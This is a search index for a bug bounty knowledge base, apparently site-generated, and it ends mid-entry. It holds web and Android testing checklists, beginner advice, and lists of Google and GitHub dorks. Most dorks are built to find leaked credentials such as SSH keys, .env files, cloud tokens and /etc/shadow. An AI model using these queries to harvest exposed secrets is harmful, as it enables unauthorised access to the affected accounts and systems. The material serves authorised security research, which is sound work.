{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-_,:!=\\[\\]()\"`/]+|\\.(?!\\d)|&[lg]t;|(?!\\b)(?=[A-Z][a-z])","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"SecurityBoat Workbook","text":"<p>Knowledge Base for Security Researchers</p>"},{"location":"Bug%20Bounty/","title":"Bug Bounty","text":""},{"location":"Bug%20Bounty/#bug-bounty","title":"Bug Bounty","text":"<ul> <li> <p> Start your Bug Bounty Journey</p> <p>Embark on your bug bounty hunting adventure with good foundation and confidence.</p> </li> <li> <p> Bug Bounty Checklist for Web App</p> <p>A comprehensive checklist for ensuring thorough web application security testing in bug bounty programs.</p> </li> <li> <p> Bug Bounty Checklist For Android</p> <p>A comprehensive checklist for ensuring thorough android application security testing in bug bounty programs.</p> </li> <li> <p> Dorking</p> <p>Uncover hidden vulnerabilities and sensitive information using advanced search engine queries.</p> </li> <li> <p> Recon</p> <p>Master the art of reconnaissance to uncover potential attack vectors and vulnerabilities in bug bounty programs.</p> </li> <li> <p> Bug Bounty &amp; Pen-Test Templates</p> <p>Streamline your bug bounty reporting process with pre-built templates.</p> </li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/","title":"Bug Bounty Checklist For Android","text":""},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#bug-bounty-checklist-for-android","title":"Bug Bounty Checklist For Android","text":""},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#table-of-contents","title":"Table of Contents","text":"<ul> <li> Important Tools</li> <li> Improper Platform Usage</li> <li> Insecure Data Storage</li> <li> Insecure Communication</li> <li> Insecure Authentication</li> <li> Insufficient Cryptography</li> <li> Insecure Authorization</li> <li> Client Code Quality</li> <li> Code Tampering</li> <li> Reverse Engineering</li> <li> Extraneous Functionality</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#important-tools","title":"Important Tools","text":"<ul> <li> MobSF</li> <li> Frida</li> <li> Yazzhini</li> <li> Objection</li> <li> Run time Security Framework (RMS)</li> <li> House</li> <li> APK Toolkit</li> <li> JADX</li> <li> Drozer</li> <li> Fridump</li> <li> APKLeaks</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#improper-platform-usage","title":"Improper Platform Usage","text":"<ul> <li> Test for app permissions.</li> <li> Test for minimum security requirements.</li> <li> Test for OS versions that are allowed to install ( Insecure version ).</li> <li> Check ports open at the Firewall.</li> <li> Test default credentials on the application server.</li> <li> Check password policy implementation.</li> <li> Test for security misconfiguration on server API.</li> <li> Test input validation on API.</li> <li> Test for information exposure through API response message.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#insecure-data-storage","title":"Insecure Data Storage","text":"<ul> <li> Testing local storage for sensitive data</li> <li> Testing Logs for sensitive data.</li> <li> Determine whether sensitive data is sent to third parties.</li> <li> Determine whether the keyboard cache is disabled for text input fields.</li> <li> Determine whether sensitive data exposed via IPC Mechanisms</li> <li> Check for sensitive data exposure through User Interface.</li> <li> Testing Backups for sensitive data.</li> <li> Finding sensitive information for Auto-Generated screenshots.</li> <li> Check memory for sensitive data.</li> <li> Testing the Device-Access-Security Policy</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#insecure-communication","title":"Insecure Communication","text":"<ul> <li> Check for insecure transport layer protocols.</li> <li> Test for insecure algorithms.</li> <li> Test for SSL pinning implementation.</li> <li> Test for End-to-End encryption.</li> <li> Check use of disabling certificate validation.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#insufficient-cryptography","title":"Insufficient Cryptography","text":"<ul> <li> Testing for key management.</li> <li> Test for use of custom encryption protocols.</li> <li> Test for token/session creation and handling.</li> </ul> <p>Insecure Authorization</p> <ul> <li> Test for client-side authorization breaches.</li> <li> Test for Insecure Direct Object Reference.</li> <li> Test for function level access controls.</li> <li> Test for bypassing business logic flaws.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#client-code-quality","title":"Client Code Quality","text":"<ul> <li> Test for SQL injection and local file inclusion.</li> <li> Test Service components.</li> <li> Test insufficient webview hardening.</li> <li> Test XML injection.</li> <li> Test for Local file inclusion through NSFileManager or webviews.</li> <li> Test for sensitive information masking.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#code-tampering","title":"Code Tampering","text":"<ul> <li> Test for unauthorize code modification.</li> <li> Test for runtime manipulation.</li> <li> Check for rooted device.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li> Test for code Obfuscating.</li> <li> Test for information leakage/ HArdcoded credentials in the binaries.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-android/#extraneous-functionality","title":"Extraneous Functionality","text":"<ul> <li> Test for password string disclosure.</li> <li> Test for hidden and unscrutinised functionality</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/","title":"Bug Bounty Checklist for Web App","text":""},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#bug-bounty-checklist-for-web-app","title":"Bug Bounty Checklist for Web App","text":""},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#table-of-contents","title":"Table of Contents","text":"<ul> <li> Recon on wildcard domain</li> <li> Single domain</li> <li> Information Gathering</li> <li> Configuration Management</li> <li> Secure Transmission</li> <li> Authentication</li> <li> Session Management</li> <li> Authorization</li> <li> Data Validation</li> <li> Denial of Service</li> <li> Business Logic</li> <li> Cryptography</li> <li> Risky Functionality - File Uploads</li> <li> Risky Functionality - Card Payment</li> <li> HTML 5</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#recon-on-wildcard-domain","title":"Recon on wildcard domain","text":"<ul> <li> Run amass</li> <li> Run subfinder</li> <li> Run assetfinder</li> <li> Run dnsgen</li> <li> Run massdns</li> <li> Use httprobe</li> <li> Run aquatone (screenshot for alive host)</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#single-domain","title":"Single Domain","text":""},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#scanning","title":"Scanning","text":"<ul> <li> Nmap scan</li> <li> Burp crawler</li> <li> ffuf (directory and file fuzzing)</li> <li> hakrawler/gau/paramspider</li> <li> Linkfinder</li> <li> Url with Android application</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#manual-checking","title":"Manual checking","text":"<ul> <li> Shodan</li> <li> Censys</li> <li> Google dorks</li> <li> Pastebin</li> <li> Github</li> <li> OSINT</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#information-gathering","title":"Information Gathering","text":"<ul> <li> Manually explore the site</li> <li> Spider/crawl for missed or hidden content</li> <li> Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store</li> <li> Check the caches of major search engines for publicly accessible sites</li> <li> Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)</li> <li> Perform Web Application Fingerprinting</li> <li> Identify technologies used</li> <li> Identify user roles</li> <li> Identify application entry points</li> <li> Identify client-side code</li> <li> Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)</li> <li> Identify co-hosted and related applications</li> <li> Identify all hostnames and ports</li> <li> Identify third-party hosted content</li> <li> Identify Debug parameters</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#configuration-management","title":"Configuration Management","text":"<ul> <li> Check for commonly used application and administrative URLs</li> <li> Check for old, backup and unreferenced files</li> <li> Check HTTP methods supported and Cross Site Tracing (XST)</li> <li> Test file extensions handling</li> <li> Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)</li> <li> Test for policies (e.g. Flash, Silverlight, robots)</li> <li> Test for non-production data in live environment, and vice-versa</li> <li> Check for sensitive data in client-side code (e.g. API keys, credentials)</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#secure-transmission","title":"Secure Transmission","text":"<ul> <li> Check SSL Version, Algorithms, Key length</li> <li> Check for Digital Certificate Validity (Duration, Signature and CN)</li> <li> Check credentials only delivered over HTTPS</li> <li> Check that the login form is delivered over HTTPS</li> <li> Check session tokens only delivered over HTTPS</li> <li> Check if HTTP Strict Transport Security (HSTS) in use</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#authentication","title":"Authentication","text":"<ul> <li> Test for user enumeration</li> <li> Test for authentication bypass</li> <li> Test for bruteforce protection</li> <li> Test password quality rules</li> <li> Test remember me functionality</li> <li> Test for autocomplete on password forms/input</li> <li> Test password reset and/or recovery</li> <li> Test password change process</li> <li> Test CAPTCHA</li> <li> Test multi factor authentication</li> <li> Test for logout functionality presence</li> <li> Test for cache management on HTTP (eg Pragma, Expires, Max-age)</li> <li> Test for default logins</li> <li> Test for user-accessible authentication history</li> <li> Test for out-of channel notification of account lockouts and successful password changes</li> <li> Test for consistent authentication across applications with shared authentication schema / SSO</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#session-management","title":"Session Management","text":"<ul> <li> Establish how session management is handled in the application (eg, tokens in cookies, token in URL)</li> <li> Check session tokens for cookie flags (httpOnly and secure)</li> <li> Check session cookie scope (path and domain)</li> <li> Check session cookie duration (expires and max-age)</li> <li> Check session termination after a maximum lifetime</li> <li> Check session termination after relative timeout</li> <li> Check session termination after logout</li> <li> Test to see if users can have multiple simultaneous sessions</li> <li> Test session cookies for randomness</li> <li> Confirm that new session tokens are issued on login, role change and logout</li> <li> Test for consistent session management across applications with shared session management</li> <li> Test for session puzzling</li> <li> Test for CSRF and clickjacking</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#authorization","title":"Authorization","text":"<ul> <li> Test for path traversal</li> <li> Test for bypassing authorization schema</li> <li> Test for vertical Access control problems (a.k.a. Privilege Escalation)</li> <li> Test for horizontal Access control problems (between two users at the same privilege level)</li> <li> Test for missing authorization</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#data-validation","title":"Data Validation","text":"<ul> <li> Test for Reflected Cross Site Scripting</li> <li> Test for Stored Cross Site Scripting</li> <li> Test for DOM based Cross Site Scripting</li> <li> Test for Cross Site Flashing</li> <li> Test for HTML Injection</li> <li> Test for SQL Injection</li> <li> Test for LDAP Injection</li> <li> Test for ORM Injection</li> <li> Test for XML Injection</li> <li> Test for XXE Injection</li> <li> Test for SSI Injection</li> <li> Test for XPath Injection</li> <li> Test for XQuery Injection</li> <li> Test for IMAP/SMTP Injection</li> <li> Test for Code Injection</li> <li> Test for Expression Language Injection</li> <li> Test for Command Injection</li> <li> Test for Overflow (Stack, Heap and Integer)</li> <li> Test for Format String</li> <li> Test for incubated vulnerabilities</li> <li> Test for HTTP Splitting/Smuggling</li> <li> Test for HTTP Verb Tampering</li> <li> Test for Open Redirection</li> <li> Test for Local File Inclusion</li> <li> Test for Remote File Inclusion</li> <li> Compare client-side and server-side validation rules</li> <li> Test for NoSQL injection</li> <li> Test for HTTP parameter pollution</li> <li> Test for auto-binding</li> <li> Test for Mass Assignment</li> <li> Test for NULL/Invalid Session Cookie</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#denial-of-service","title":"Denial of Service","text":"<ul> <li> Test for anti-automation</li> <li> Test for account lockout</li> <li> Test for HTTP protocol DoS</li> <li> Test for SQL wildcard DoS</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#business-logic","title":"Business Logic","text":"<ul> <li> Test for feature misuse</li> <li> Test for lack of non-repudiation</li> <li> Test for trust relationships</li> <li> Test for integrity of data</li> <li> Test segregation of duties</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#cryptography","title":"Cryptography","text":"<ul> <li> Check if data which should be encrypted is not</li> <li> Check for wrong algorithms usage depending on context</li> <li> Check for weak algorithms usage</li> <li> Check for proper use of salting</li> <li> Check for randomness functions</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#risky-functionality-file-uploads","title":"Risky Functionality - File Uploads","text":"<ul> <li> Test that acceptable file types are whitelisted</li> <li> Test that file size limits, upload frequency and total file counts are defined and are enforced</li> <li> Test that file contents match the defined file type</li> <li> Test that all file uploads have Anti-Virus scanning in-place.</li> <li> Test that unsafe filenames are sanitised</li> <li> Test that uploaded files are not directly accessible within the web root</li> <li> Test that uploaded files are not served on the same hostname/port</li> <li> Test that files and other media are integrated with the authentication and authorisation schemas</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#risky-functionality-card-payment","title":"Risky Functionality - Card Payment","text":"<ul> <li> Test for known vulnerabilities and configuration issues on Web Server and Web Application</li> <li> Test for default or guessable password</li> <li> Test for non-production data in live environment, and vice-versa</li> <li> Test for Injection vulnerabilities</li> <li> Test for Buffer Overflows</li> <li> Test for Insecure Cryptographic Storage</li> <li> Test for Insufficient Transport Layer Protection</li> <li> Test for Improper Error Handling</li> <li> Test for all vulnerabilities with a CVSS v2 score &gt; 4.0</li> <li> Test for Authentication and Authorization issues</li> <li> Test for CSRF</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#html-5","title":"HTML 5","text":"<ul> <li> Test Web Messaging</li> <li> Test for Web Storage SQL injection</li> <li> Check CORS implementation</li> <li> Check Offline Web Application</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-checklist-for-web-app/#source","title":"Source:","text":"<p>https://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md</p>"},{"location":"Bug%20Bounty/bug-bounty-dorks/","title":"Dorking","text":""},{"location":"Bug%20Bounty/bug-bounty-dorks/#dorking","title":"Dorking","text":""},{"location":"Bug%20Bounty/bug-bounty-dorks/#common","title":"Common","text":"<ul> <li><code>inurl /bug bounty</code> </li> <li><code>inurl : / security</code> </li> <li><code>inurl:security.txt</code> </li> <li><code>inurl:security \"reward\"</code> </li> <li><code>inurl : /responsible disclosure</code> </li> <li><code>inurl : /responsible-disclosure/ reward</code> </li> <li><code>inurl : / responsible-disclosure/ swag</code> </li> <li><code>inurl : / responsible-disclosure/ bounty</code> </li> <li><code>inurl:'/responsible disclosure' hoodie</code> </li> <li><code>responsible disclosure swag r=h:com</code> </li> <li><code>responsible disclosure hall of fame</code> </li> <li><code>responsible disclosure europe</code> </li> <li><code>responsible disclosure white hat</code> </li> <li><code>white hat program</code> </li> <li><code>insite:\"responsible disclosure\" -inurl:nl</code> </li> <li><code>intext responsible disclosure</code> </li> <li><code>site eu responsible disclosure</code> </li> <li><code>site .nl responsible disclosure</code> </li> <li><code>site responsible disclosure</code> </li> <li><code>responsible disclosure:sites</code> </li> <li><code>responsible disclosure r=h:nl</code> </li> <li><code>responsible disclosure r=h:uk</code> </li> <li><code>responsible disclosure r=h:eu</code> </li> <li><code>responsible disclosure bounty r=h:nl</code> </li> <li><code>responsible disclosure bounty r=h:uk</code> </li> <li><code>responsible disclosure bounty r=h:eu</code> </li> <li><code>responsible disclosure swag r=h:nl</code> </li> <li><code>responsible disclosure swag r=h:uk</code> </li> <li><code>responsible disclosure swag r=h:eu</code> </li> <li><code>responsible disclosure reward r=h:nl</code> </li> <li><code>responsible disclosure reward r=h:uk</code> </li> <li><code>responsible disclosure reward r=h:eu</code> </li> <li><code>\"powered by bugcrowd\" -site:bugcrowd.com</code> </li> <li><code>\"powered by hackerone\" \"submit vulnerability report\"</code> </li> <li><code>\"submit vulnerability report\"</code> </li> <li><code>site:responsibledisclosure.com</code> </li> <li><code>inurl:'vulnerability-disclosure-policy' reward</code> </li> <li><code>intext:Vulnerability Disclosure site:nl</code> </li> <li><code>intext:Vulnerability Disclosure site:eu</code> </li> <li><code>site:*.*.nl intext:security report reward</code> </li> <li><code>site:*.*.nl intext:responsible disclosure reward</code> </li> <li><code>\"security vulnerability\" \"report\"</code> </li> <li><code>inurl\"security report\"</code> </li> <li><code>\"responsible disclosure\" university</code> </li> <li><code>inurl:/responsible-disclosure/ university</code> </li> <li><code>buy bitcoins \"bug bounty\"</code> </li> <li><code>inurl:/security ext:txt \"contact\"</code> </li> <li><code>\"powered by synack\"</code> </li> <li><code>intext:responsible disclosure bounty</code> </li> <li><code>inurl: private bugbountyprogram</code> </li> <li><code>inurl:/.well-known/security ext:txt</code> </li> <li><code>inurl:/.well-known/security ext:txt intext:hackerone</code> </li> <li><code>inurl:/.well-known/security ext:txt -hackerone -bugcrowd -synack -openbugbounty</code> </li> <li><code>inurl:reporting-security-issues</code> </li> <li><code>inurl:security-policy.txt ext:txt</code> </li> <li><code>site:*.*.* inurl:bug inurl:bounty</code> </li> <li><code>site:help.*.* inurl:bounty</code> </li> <li><code>site:support.*.* intext:security report reward</code> </li> <li><code>intext:security report monetary inurl:security</code> </li> <li><code>intext:security report reward inurl:report</code> </li> <li><code>site:security.*.* inurl: bounty</code> </li> <li><code>site:*.*.de inurl:bug inurl:bounty</code> </li> <li><code>site:*.*.uk intext:security report reward</code> </li> <li><code>site:*.*.cn intext:security report reward</code> </li> <li><code>\"vulnerability reporting policy\"</code> </li> <li><code>\"van de melding met een minimum van een\" -site:responsibledisclosure.nl</code> </li> <li><code>inurl:/security ext:txt \"contact\"</code> </li> <li><code>inurl:responsible-disclosure-policy</code> </li> <li><code>\"Submission Form powered by Bugcrowd\" -bugcrowd.com</code> </li> <li><code>\"If you believe you've found a security vulnerability\"</code> </li> <li><code>intext:\"BugBounty\" and intext:\"BTC\" and intext:\"reward\"</code> </li> <li><code>intext:bounty inurl:/security</code> </li> <li><code>inurl:\"bug bounty\" and intext:\"\u20ac\" and inurl:/security</code> </li> <li><code>inurl:\"bug bounty\" and intext:\"$\" and inurl:/security</code> </li> <li><code>inurl:\"bug bounty\" and intext:\"INR\" and inurl:/security</code> </li> <li><code>inurl:/security.txt \"mailto*\" -github.com  -wikipedia.org -portswigger.net -magento</code> </li> <li><code>site:http://codepad.co \"company\"</code> </li> <li><code>site:http://scribd.com \"company\"</code> </li> <li><code>site:http://npmjs.com \"company\"</code> </li> <li><code>site:http://npm.runkit.com \"company\"</code> </li> <li><code>site:http://libraries.io \"company\"</code> </li> <li><code>site:http://ycombinator.com \"company\"</code> </li> <li><code>site:http://coggle.it \"company\"</code> </li> <li><code>site:http://papaly.com \"company\"</code> </li> <li><code>site:http://google.com \"company\"</code> </li> <li><code>site:http://trello.com \"company\"</code> </li> <li><code>site:http://prezi.com \"company\"</code> </li> <li><code>site:http://jsdelivr.net \"company\"</code> </li> <li><code>site:http://codepen.io \"company\"</code> </li> <li><code>site:http://codeshare.io \"company\"</code> </li> <li><code>site:http://sharecode.io \"company\"</code> </li> <li><code>site:http://pastebin.com \"company\"</code> </li> <li><code>site:http://repl.it \"company\"</code> </li> <li><code>site:https://lnkd.in/dMqN_2B \"company\"</code> </li> <li><code>site:http://gitter.im \"company\"</code> </li> <li><code>site:http://bitbucket.org \"company\"</code> </li> <li><code>site:*.atlassian.net \"company\"</code> </li> <li><code>site:atlassian.net \"company\"</code> </li> <li><code>inurl:gitlab \"company\"</code> </li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-dorks/#github-dorks-and-recon","title":"Github Dorks and Recon","text":"Dork Description root_password root_password redis_password redis_password bucket_password bucket_password secret_access_key secret_access_key access_key access_key dbuser db user dbpassword db password \u201cCompany\u201d config \u201cCompany\u201d pwd \u201cCompany\u201d token \u201cCompany\u201d ftp \u201cCompany\u201d credentials \u201cCompany\u201d login \u201cCompany\u201d secret \u201cCompany\u201d pass \u201cCompany\u201d password \u201cCompany\u201d key \u201cCompany\u201d send_keys or send,keys If other keywords related to passwords failed \u201cCompany\u201d ssh2_auth_password Unauthorized Access to Servers \u201cCompany\u201d JDBC Database Credentials \u201cCompany\u201d connectionstring Database Credentials \u201cCompany\u201d security_credentials LDAP ( active directory) filename:.npmrc _auth npm registry authentication data filename:.dockercfg auth docker registry authentication data extension:pem private private keys extension:ppk private puttygen private keys filename:id_rsa or filename:id_dsa private ssh keys extension:sql mysql dump mysql dump extension:sql mysql dump password mysql dump look for password; you can try varieties filename:credentials aws_access_key_id might return false negatives with dummy values filename:.s3cfg might return false negatives with dummy values filename:wp-config.php wordpress config files filename:.htpasswd htpasswd files filename:.env DB_USERNAME NOT homestead laravel .env (CI, various ruby based frameworks too) filename:.env MAIL_HOST=smtp.gmail.com gmail smtp configuration (try different smtp services too) filename:.git-credentials git credentials store, add NOT username for more valid results PT_TOKEN language:bash pivotaltracker tokens filename:.bashrc password search for passwords, etc. in .bashrc (try with .bash_profile too) filename:.bashrc mailchimp variation of above (try more variations) filename:.bash_profile aws aws access and secret keys rds.amazonaws.com password Amazon RDS possible credentials extension:json api.forecast.io try variations, find api keys/secrets extension:json mongolab.com mongolab credentials in json configs extension:yaml mongolab.com mongolab credentials in yaml configs (try with yml) jsforce extension:js conn.login possible salesforce credentials in nodejs projects SF_USERNAME salesforce possible salesforce credentials filename:.tugboat NOT _tugboat Digital Ocean tugboat config HEROKU_API_KEY language:shell Heroku api keys HEROKU_API_KEY language:json Heroku api keys in json files filename:.netrc password netrc that possibly holds sensitive credentials filename:_netrc password netrc that possibly holds sensitive credentials filename:hub oauth_token hub config that stores github tokens filename:robomongo.json mongodb credentials file used by robomongo filename:filezilla.xml Pass filezilla config file with possible user/pass to ftp filename:recentservers.xml Pass filezilla config file with possible user/pass to ftp filename:config.json auths docker registry authentication data filename:idea14.key IntelliJ Idea 14 key, try variations for other versions filename:config irc_pass possible IRC config filename:connections.xml possible db connections configuration, try variations to be specific filename:express.conf path:.openshift openshift config, only email and server thou filename:.pgpass PostgreSQL file which can contain passwords filename:proftpdpasswd Usernames and passwords of proftpd created by cpanel filename:ventrilo_srv.ini Ventrilo configuration [WFClient] Password= extension:ica WinFrame-Client infos needed by users to connect toCitrix Application Servers filename:server.cfg rcon password Counter Strike RCON Passwords JEKYLL_GITHUB_TOKEN Github tokens used for jekyll filename:.bash_history Bash history file filename:.cshrc RC file for csh shell filename:.history history file (often used by many tools) filename:.sh_history korn shell history filename:sshd_config OpenSSH server config filename:dhcpd.conf DHCP service config filename:prod.exs NOT prod.secret.exs Phoenix prod configuration file filename:prod.secret.exs Phoenix prod secret filename:configuration.php JConfig password Joomla configuration file filename:config.php dbpasswd PHP application database password (e.g., phpBB forum software) path:sites databases password Drupal website database credentials shodan_api_key language:python Shodan API keys (try other languages too) filename:shadow path:etc Contains encrypted passwords and account information of new unix systems filename:passwd path:etc Contains user account information including encrypted passwords of traditional unix systems extension:avastlic Contains license keys for Avast! Antivirus extension:dbeaver-data-sources.xml DBeaver config containing MySQL Credentials filename:.esmtprc password esmtp configuration extension:json googleusercontent client_secret OAuth credentials for accessing Google APIs HOMEBREW_GITHUB_API_TOKEN language:shell Github token usually set by homebrew users xoxp OR xoxb Slack bot and private tokens .mlab.com password MLAB Hosted MongoDB Credentials filename:logins.json Firefox saved password collection (key3.db usually in same repo) filename:CCCam.cfg CCCam Server config file msg nickserv identify filename:config Possible IRC login passwords filename:settings.py SECRET_KEY Django secret keys (usually allows for session hijacking, RCE, etc)"},{"location":"Bug%20Bounty/bug-bounty-dorks/#google-dorking","title":"Google Dorking","text":"<ul> <li> <p>site: This operator restricts results to pages within a specified website or domain. For example, \"site:wikipedia.org\" will only return results from Wikipedia.</p> </li> <li> <p>intitle: This operator searches for pages that have a specific word or phrase in the title For example, \"intitle:Google Dorking\" will return pages with \"Google Dorking\" in the title.</p> </li> <li> <p>filetype: This operator limits results to specific file types. For example \"filetype:pdf\" will only return PDF files.</p> </li> <li> <p>inurl: This operator searches for a specific word or phrase within the URL. For example, \"inurl:login\" will return pages with \"login\" in the URL.</p> </li> <li> <p>related: This operator finds sites related to a specified URL. For example, \"related:example.com\" will return websites similar to example.com.</p> </li> <li> <p>cache: This operator displays the Google cached version of a webpage. For example, \"cache:example.com\" will show Google's cached version of example.com.</p> </li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-dorks/#shodan","title":"Shodan","text":"<ul> <li>port: Identifies devices based on specific open ports.</li> <li>hostname: Filters devices based on their hostname.</li> <li>country: Narrows down results by specifying a country.</li> <li>product: Searches for devices based on the product or software running on them.</li> <li>os: Identifies devices based on their operating system.</li> <li>city: Filters results by specifying a city.</li> <li>after: Finds devices that were indexed after a specific date.</li> <li>before: Finds devices that were indexed before a specific date.</li> <li>ssl: Identifies devices with SSL certificates.</li> <li>http.component: Searches for devices based on specific HTTP components.</li> <li>org: Filters results to devices associated with a specific organization.</li> <li>has_screenshot: Identifies devices with available screenshots.</li> <li>net: Searches within a specific IP range.</li> <li>isp: Filters devices belonging to a specific Internet Service Provider.</li> <li>title: Searches for devices with specific content in the HTML title tag.</li> </ul>"},{"location":"Bug%20Bounty/bug-bounty-dorks/#references","title":"References","text":"<ul> <li> <p>Bugcrowd University - GitHub Recon and Sensitive Data Exposure</p> </li> <li> <p>http://10degres.net/github-tools-collection/</p> </li> <li> <p>https://github.com/gwen001/github-search</p> </li> <li> <p>https://dorks.faisalahmed.me/#</p> </li> <li> <p>https://medium.com/bugbountywriteup/using-shodan-better-way-b40f330e45f6</p> </li> </ul>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/","title":"Start your Bug Bounty Journey","text":""},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#start-your-bug-bounty-journey","title":"Start your Bug Bounty Journey","text":"<p>To start your bug bounty journey, numerous platforms are publicly accessible for anyone interested in joining the bug bounty community. We refrain from naming specific platforms, as we believe it's essential for you to take your first steps independently!</p> <p>For beginners or individuals entirely new to application security, it's crucial to have a basic understanding of the following:</p> <ul> <li>Linux</li> <li>DNS</li> <li>Website functioning</li> <li>Data transfer mechanisms</li> <li>OWASP top 10 (for both web and mobile)</li> <li>Networking basics</li> <li>Effective use of search engines</li> </ul> <p>In the bug bounty realm, it's commonly expected that you conduct basic Google searches to find answers. If you can't find a solution, you can always turn to the community on various social platforms for assistance.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#learning-linux","title":"Learning Linux","text":"<p>You have the flexibility to choose any Linux distribution for hacking purposes. Some distributions are tailored as hacking environments, offering pre-installed tools. Alternatively, using a mainstream distribution like Ubuntu for hacking can enhance your Linux skills, albeit with occasional installation challenges. Strengthening your Linux proficiency is valuable for scripting automated hacking tools in the future.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#understanding-dns-and-networking","title":"Understanding DNS and Networking","text":"<p>Understanding how websites function, the role of DNS, and networking fundamentals like subnets, ports, ASN, TCP, UDP, and ICMP is essential for bug bounty endeavors.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#familiarizing-with-owasp-top-10","title":"Familiarizing with OWASP Top 10","text":"<p>The OWASP Top 10 serves as a foundational awareness document for developers and application security enthusiasts. It covers vulnerabilities in both web and mobile applications and serves as an excellent starting point for learning about security vulnerabilities.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#leveraging-search-engines","title":"Leveraging Search Engines","text":"<p>Utilizing search engines effectively is integral to bug hunting. If you encounter difficulties, remember that most answers are readily available on the internet. Engage with the infosec community for guidance and support.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#learning-attack-techniques","title":"Learning Attack Techniques","text":"<p>In addition to OWASP Top 10, explore platforms that offer insights into various attack vectors and provide lab environments to practice exploiting vulnerabilities.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#exercise-patience","title":"Exercise Patience","text":"<p>Patience is paramount in bug bounty hunting. Finding your first bug and evolving into a skilled bug hunter takes time and consistent effort. Treat hacking as a continuous learning process.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#learning-from-youtube-channels","title":"Learning from YouTube Channels","text":"<p>YouTube is a valuable resource for bug bounty education. Explore recommended channels that cover bug bounty topics comprehensively.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#engaging-in-capture-the-flag-ctf-challenges","title":"Engaging in Capture The Flag (CTF) Challenges","text":"<p>Participating in CTF challenges can enhance your hacking skills. Several platforms offer CTF challenges to help you sharpen your abilities.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#selecting-bug-bounty-programs","title":"Selecting Bug Bounty Programs","text":"<p>When selecting bug bounty programs, prioritize applications you're familiar with as a regular user. Consider your comfort level with web or mobile applications to guide your choice.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#dealing-with-challenges","title":"Dealing with Challenges","text":"<p>Struggling to find bugs is a common challenge. Remember that setbacks are part of the learning process. Take breaks when needed and return with renewed determination.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#handling-duplicates","title":"Handling Duplicates","text":"<p>Encountering duplicate bugs is normal and indicates you're on the right track. Explore different exploitation methods and attempt to bypass patched vulnerabilities.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#exploring-educational-courses","title":"Exploring Educational Courses","text":"<p>While there's debate surrounding the efficacy of bug bounty courses, some reputable courses can significantly aid your learning journey. Choose courses wisely to enhance your skills.</p>"},{"location":"Bug%20Bounty/how-to-get-started-in-a-bug-bounty/#final-thoughts","title":"Final Thoughts","text":"<p>Embarking on a bug bounty journey requires dedication and patience. While it may lead to frustration and burnout at times, the satisfaction of contributing to cybersecurity and gaining recognition is invaluable.</p>"},{"location":"Bug%20Bounty/reconnotes/","title":"Recon","text":""},{"location":"Bug%20Bounty/reconnotes/#recon","title":"Recon","text":""},{"location":"Bug%20Bounty/reconnotes/#shortcut-to-extract-subdomains-and-running-services","title":"Shortcut to Extract 